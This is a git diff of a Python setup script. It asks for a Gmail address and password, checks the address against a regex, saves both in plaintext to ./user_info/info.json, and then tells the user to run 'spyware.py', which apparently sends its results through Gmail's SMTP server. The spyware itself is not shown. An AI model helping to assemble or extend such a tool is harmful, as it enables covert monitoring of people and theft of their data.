@@ -1,7 +1,7 @@
 import os
 import json
 from termcolor import colored
-from pyfiget import figlet_format
+from pyfiglet import figlet_format
 import re
 
 
@@ -15,15 +15,29 @@ def create_file(email, password):
         os.mkdir('user_info')
         print('[+] Created ./user_info directory')
 
-    with open('info.json', 'a+') as output_file:
+    with open('./user_info/info.json', 'w+') as output_file:
         json_dump = json.dumps(info)
         output_file.write(json_dump)
 
     print('[+] Created ./user_info/info.json file')
 
 
-def validate_email(email):
-    pass
+def get_email():
+    regex = '[A-Za-z0-9\.\+_]+@gmail\.com'
+    result = True
+
+    while result:
+        email = input('Email: ')
+        match = re.search(regex, email)
+
+        try:
+            match.group()
+            result = False
+            return email
+
+        except AttributeError:
+            print('Wrong email!\n')
+
 
 
 def main():
@@ -34,12 +48,12 @@ def main():
     print('===============================================================\n')
     print('You\'ll need gmail account to process (program uses their SMTP server)')
 
-    email = input('Email: ')
-    validate_email(email)
+    email = get_email()
 
     passwword = input('Password: ')
-
     create_file(email, passwword)
+
+    print(colored('\nOk, we\'re set, now run spyware.py file', color='yellow'))
 
 
 if __name__ == '__main__':
